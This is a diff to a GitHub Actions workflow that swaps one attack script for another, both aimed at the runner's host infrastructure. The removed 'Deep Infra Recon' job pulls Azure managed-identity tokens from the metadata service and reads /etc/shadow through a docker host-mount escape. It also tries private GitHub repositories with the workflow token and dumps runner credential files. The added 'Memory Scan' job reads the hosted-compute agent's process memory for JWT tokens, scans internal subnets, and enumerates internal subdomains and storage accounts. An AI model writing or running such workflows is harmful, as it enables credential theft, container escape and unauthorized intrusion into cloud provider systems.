@@ -1,113 +1,46 @@
-name: Deep Infra Recon
+name: Memory Scan
 on:
   workflow_dispatch:
 jobs:
-  recon:
+  scan:
     runs-on: ubuntu-latest
     steps:
-      - name: Internal services
+      - name: scan memory and network
+        timeout-minutes: 8
         run: |
           set +e
-
-          echo "=== HOSTED COMPUTE ORCHESTRATOR ==="
-          curl -sv --connect-timeout 5 https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/vm/v1 2>&1
+          HCA_PID=$(pgrep hosted-compute)
+          echo "HCA PID: $HCA_PID"
           echo ""
-          curl -sv --connect-timeout 5 https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/ 2>&1
+          echo "=== STRACE HCA ==="
+          timeout 8 strace -f -p $HCA_PID -e trace=write -s 500 2>&1 | grep -v EAGAIN | head -80 &
+          STRACE_PID=$!
+          sleep 10
+          kill $STRACE_PID 2>/dev/null
+          wait $STRACE_PID 2>/dev/null
           echo ""
-
-          echo "=== ALL AZURE IMDS ENDPOINTS ==="
-          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" 2>&1 | python3 -m json.tool 2>/dev/null
+          echo "=== GO HEAP JWT SCAN ==="
+          dd if=/proc/$HCA_PID/mem bs=4096 count=2048 skip=$((0xc000000000/4096)) 2>/dev/null | strings -n 30 | grep -E '^eyJ' | head -20
           echo ""
-
-          echo "=== AZURE MANAGED IDENTITY (all resources) ==="
-          for resource in "https://management.azure.com/" "https://vault.azure.net" "https://storage.azure.com/" "https://graph.microsoft.com/" "https://database.windows.net/" "https://dev.azuresynapse.net"; do
-            echo "--- Resource: $resource ---"
-            curl -s --connect-timeout 3 -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$resource" 2>&1
-            echo ""
-          done
-
-          echo "=== AZURE WIRE SERVER DEEP ==="
-          for path in "/" "/machine" "/machine?comp=goalstate" "/machine?comp=config" "/machine/plugins" "/machine?comp=telemetrydata" "/healthcheck"; do
-            echo "--- $path ---"
-            curl -s --connect-timeout 3 -H "x-ms-version: 2012-11-30" "http://168.63.129.16$path" 2>&1 | head -10
-            echo ""
-          done
-
-          echo "=== DOCKER ESCAPE ATTEMPT ==="
-          echo "Docker socket:"
-          ls -la /var/run/docker.sock 2>&1
+          echo "=== GO HEAP URL SCAN ==="
+          dd if=/proc/$HCA_PID/mem bs=4096 count=2048 skip=$((0xc000000000/4096)) 2>/dev/null | strings -n 20 | grep -iE 'orchestrator|scheduler|auth|token|bearer|attest' | head -30
           echo ""
-
-          echo "Host /etc/shadow via docker mount:"
-          docker run --rm -v /:/host alpine cat /host/etc/shadow 2>&1 | head -10
+          echo "=== BINARY GO DEPS ==="
+          go version -m /opt/hca/hosted-compute-agent 2>&1 | head -40
           echo ""
-
-          echo "Host processes via docker:"
-          docker run --rm --pid=host alpine ps aux 2>&1 | head -30
+          echo "=== BINARY ATTESTATION STRINGS ==="
+          strings /opt/hca/hosted-compute-agent | grep -iE 'attestation|jwt|oidc|msal|aad|managed.identity|imds|entra|goalstate' | sort -u | head -30
           echo ""
-
-          echo "Host network via docker:"
-          docker run --rm --net=host alpine sh -c "wget -qO- http://169.254.169.254/metadata/instance?api-version=2021-02-01 --header='Metadata:true' 2>&1 | head -50" 2>&1
+          echo "=== BINARY MODULE PATHS ==="
+          strings /opt/hca/hosted-compute-agent | grep 'github.com/' | sort -u | head -30
           echo ""
-
-          echo "=== GITHUB INTERNAL HOSTS ==="
-          for host in "github.com" "api.github.com" "githubapp.com" "github.net" "actions-results.githubusercontent.com" "pipelines.actions.githubusercontent.com" "vstoken.actions.githubusercontent.com" "token.actions.githubusercontent.com" "results-receiver.actions.githubusercontent.com" "codeload.github.com" "alive.github.com" "collector.github.com"; do
-            echo "--- $host ---"
-            dig +short $host 2>/dev/null | head -3
-          done
-
+          echo "=== WIDER SUBNET SCAN ==="
+          for s in $(seq 0 15); do for h in 1 10 100 254; do timeout 0.3 bash -c "echo >/dev/tcp/10.1.$s.$h/443" 2>/dev/null && echo "10.1.$s.$h:443 OPEN"; done; done
           echo ""
-          echo "=== RESOLVE INTERNAL HOSTS ==="
-          for host in "hosted-compute-request-orchestrator-prod-iad-02.githubapp.com" "actions-results-prod.githubapp.com" "actions-cache-prod.githubapp.com" "runner-provisioner.githubapp.com" "codespace-provisioner.githubapp.com"; do
-            echo "--- $host ---"
-            dig +short $host 2>/dev/null | head -3
-            curl -s --connect-timeout 3 "https://$host/" 2>&1 | head -5
-            echo ""
-          done
-
-          echo "=== CURL INTERNAL GITHUB SERVICES ==="
-          for url in "https://actions-results.githubusercontent.com/" "https://pipelines.actions.githubusercontent.com/" "https://codeload.github.com/" "https://alive.github.com/" "https://collector.github.com/"; do
-            echo "--- $url ---"
-            curl -sv --connect-timeout 3 "$url" 2>&1 | head -15
-            echo ""
-          done
-
-          echo "=== GITHUB_TOKEN SCOPES ==="
-          curl -sI -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/user 2>&1 | grep -i "x-oauth-scopes\|x-accepted-oauth-scopes\|x-ratelimit"
+          echo "=== GITHUBAPP SUBDOMAINS ==="
+          for sub in admin api internal monitoring grafana prometheus vault consul render copilot-proxy actions-cache actions-results runner-provisioner codespace-provisioner; do IP=$(dig +short $sub.githubapp.com 2>/dev/null | tail -1); [ -n "$IP" ] && echo "$sub.githubapp.com -> $IP" && curl -sk --connect-timeout 2 "https://$sub.githubapp.com/" 2>/dev/null | head -2; done
           echo ""
-
-          echo "=== TRY ACCESS PRIVATE GITHUB REPOS ==="
-          curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/github/github 2>&1 | head -5
-          curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/github/docs-internal 2>&1 | head -5
+          echo "=== AZURE STORAGE ==="
+          for name in githubactions githubrunners ghactions hostedcompute actionsrunner; do curl -sk --connect-timeout 2 "https://$name.blob.core.windows.net/?comp=list" 2>&1 | head -3; done
           echo ""
-
-          echo "=== ENVIRONMENT FILES ==="
-          cat /home/runner/work/_temp/_runner_file_commands/*.txt 2>/dev/null
-          cat /home/runner/.credentials 2>/dev/null
-          cat /home/runner/.credentials_rsaparams 2>/dev/null
-          ls -la /home/runner/.credentials* 2>/dev/null
-          cat /home/runner/.runner 2>/dev/null
-          echo ""
-
-          echo "=== RUNNER CONFIG ==="
-          cat /home/runner/work/_temp/.runner 2>/dev/null || true
-          find /home/runner -name "*.json" -size +0 2>/dev/null | head -10
-          for f in $(find /home/runner -name "*.json" -size +0 2>/dev/null | head -5); do
-            echo "--- $f ---"
-            cat "$f" 2>/dev/null | head -10
-          done
-
-          echo ""
-          echo "=== NETWORK CONNECTIONS ==="
-          ss -tnp 2>&1 | head -20
-          echo ""
-
-          echo "=== FULL /etc/hosts ==="
-          cat /etc/hosts
-          echo ""
-
-          echo "=== IPTABLES ==="
-          sudo iptables -L -n 2>&1 | head -20
-          echo ""
-
           echo "=== DONE ==="
